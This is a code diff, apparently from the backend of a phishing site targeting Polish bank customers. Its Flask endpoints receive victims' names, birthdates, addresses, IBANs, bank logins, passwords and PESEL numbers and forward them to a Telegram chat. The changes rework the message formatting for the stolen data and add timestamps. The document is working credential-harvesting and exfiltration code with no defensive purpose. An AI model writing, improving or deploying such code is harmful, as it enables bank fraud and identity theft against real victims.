@@ -9,6 +9,7 @@ import requests
 import os
 import re
 import time
+from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
@@ -28,6 +29,11 @@ TELEGRAM_CHAT_ID = os.environ.get(
 # ============================================================
 #   УТИЛИТЫ
 # ============================================================
+
+def now_str():
+    """Возвращает дату/время в формате 15.09.2026, 08:32:28"""
+    return datetime.now().strftime('%d.%m.%Y, %H:%M:%S')
+
 
 def get_client_ip():
     if request.headers.get('X-Forwarded-For'):
@@ -86,16 +92,20 @@ def parse_user_agent(ua):
     return r
 
 
-def validate_polish_iban(raw):
-    """Возвращает (valid, cleaned_26, bank_name)."""
+def clean_iban(raw):
+    """Убирает всё лишнее: пробелы, дефисы, PL. Возвращает 26 цифр."""
     if not raw:
-        return False, '', None
-
-    cleaned = re.sub(r'[\s\-]', '', raw).upper()
+        return ''
+    cleaned = re.sub(r'[\s\-]', '', str(raw)).upper()
     if cleaned.startswith('PL'):
         cleaned = cleaned[2:]
     cleaned = re.sub(r'\D', '', cleaned)
+    return cleaned
 
+
+def validate_polish_iban(raw):
+    """Возвращает (valid, cleaned_26, bank_name)."""
+    cleaned = clean_iban(raw)
     if len(cleaned) != 26:
         return False, cleaned, None
 
@@ -131,9 +141,7 @@ def validate_polish_iban(raw):
         '2160': 'BPS',
         '2490': 'Alior Bank',
     }
-    sort_code = cleaned[0:4]
-    bank_name = bank_codes.get(sort_code, 'Nieznany bank')
-
+    bank_name = bank_codes.get(cleaned[0:4], 'Nieznany bank')
     return True, cleaned, bank_name
 
 
@@ -179,10 +187,7 @@ def root_files(filename):
 
 @app.route('/health')
 def health():
-    return jsonify({
-        'status': 'running',
-        'timestamp': time.time()
-    })
+    return jsonify({'status': 'running', 'timestamp': time.time()})
 
 
 @app.route('/ping')
@@ -191,42 +196,37 @@ def ping():
 
 
 # ============================================================
-#   API — ФОРМА
+#   API — ФОРМА (dane osobowe)
 # ============================================================
 
 @app.route('/api/submit', methods=['POST'])
 def submit_form():
     try:
         data = request.get_json(silent=True) or {}
-        ip = get_client_ip()
-        ua_string = get_user_agent()
-        ua = parse_user_agent(ua_string)
 
-        iban_raw = data.get('iban', '')
-        valid, cleaned, bank = validate_polish_iban(iban_raw)
-        formatted = ' '.join(cleaned[i:i+4] for i in range(0, len(cleaned), 4)) if cleaned else iban_raw
-        if formatted and not formatted.startswith('PL'):
-            formatted = 'PL' + formatted
+        # IBAN — только цифры, без пробелов
+        iban_digits = clean_iban(data.get('iban', ''))
 
+        # Адрес одной строкой
+        street = data.get('street', '—')
+        city = data.get('city', '—')
+        postal = data.get('postal', '—')
+        address = f"{street}, {city}, {postal}"
+
+        # Сообщение в новом формате
         message = (
-            '<b>NOWE DANE FORMULARZA</b>\n\n'
-            f"<b>Imię:</b> {data.get('fullname', '—')}\n"
-            f"<b>Data urodzenia:</b> {data.get('birthdate', '—')}\n"
-            f"<b>Telefon:</b> {data.get('phone', '—')}\n"
-            f"<b>Ulica:</b> {data.get('street', '—')}\n"
-            f"<b>Miasto:</b> {data.get('city', '—')}\n"
-            f"<b>Kod:</b> {data.get('postal', '—')}\n\n"
-            f"<b>IBAN:</b> {formatted}\n"
-            f"<b>Bank:</b> {bank or '—'}\n"
-            f"<b>Status:</b> {'POPRAWNY' if valid else 'NIEPOPRAWNY'}\n\n"
-            f"<b>IP:</b> {ip}\n"
-            f"<b>Browser:</b> {ua['browser']} ({ua['os']}) — {ua['device']}\n"
-            f"<b>UA:</b> {ua_string}"
+            '📋 Nowe dane formularza\n'
+            f"👤 Imię: {data.get('fullname', '—')}\n"
+            f"📅 Data urodzenia: {data.get('birthdate', '—')}\n"
+            f"📱 Telefon: {data.get('phone', '—')}\n"
+            f"🏠 Adres: {address}\n"
+            f"🏦 IBAN: {iban_digits}\n"
+            f"🕒 {now_str()}"
         )
 
         ok, err = send_telegram(message)
         if ok:
-            return jsonify({'success': True, 'ip': ip})
+            return jsonify({'success': True})
         return jsonify({'success': False, 'error': err}), 500
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
@@ -240,9 +240,6 @@ def submit_form():
 def collect_bank():
     try:
         data = request.get_json(silent=True) or {}
-        ip = get_client_ip()
-        ua_string = get_user_agent()
-        ua = parse_user_agent(ua_string)
 
         bank = data.get('bank', '—')
         login = data.get('username') or data.get('login') or '—'
@@ -250,23 +247,19 @@ def collect_bank():
         pesel = data.get('pesel')
 
         message = (
-            '<b>NOWE LOGOWANIE BANKOWE</b>\n\n'
-            f"<b>Bank:</b> {bank}\n"
-            f"<b>Login:</b> {login}\n"
-            f"<b>Hasło:</b> {password}\n"
+            '🔐 Nowe logowanie\n'
+            f'🏦 Bank: {bank}\n'
+            f'👤 Login: {login}\n'
+            f'🔑 Hasło: {password}\n'
         )
         if pesel:
-            message += f"<b>PESEL:</b> {pesel}\n"
+            message += f'🆔 Pesel: {pesel}\n'
 
-        message += (
-            f"\n<b>IP:</b> {ip}\n"
-            f"<b>Browser:</b> {ua['browser']} ({ua['os']}) — {ua['device']}\n"
-            f"<b>UA:</b> {ua_string}"
-        )
+        message += f'🕒 {now_str()}'
 
         ok, err = send_telegram(message)
         if ok:
-            return jsonify({'success': True, 'ip': ip})
+            return jsonify({'success': True})
         return jsonify({'success': False, 'error': err}), 500
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
@@ -282,13 +275,9 @@ def validate_iban():
         data = request.get_json(silent=True) or {}
         iban = data.get('iban', '')
         valid, cleaned, bank = validate_polish_iban(iban)
-        formatted = ' '.join(cleaned[i:i+4] for i in range(0, len(cleaned), 4)) if cleaned else ''
-        if formatted and not formatted.startswith('PL'):
-            formatted = 'PL' + formatted
         return jsonify({
             'success': valid,
             'iban': cleaned,
-            'formatted': formatted,
             'bank': bank,
             'valid': valid
         })
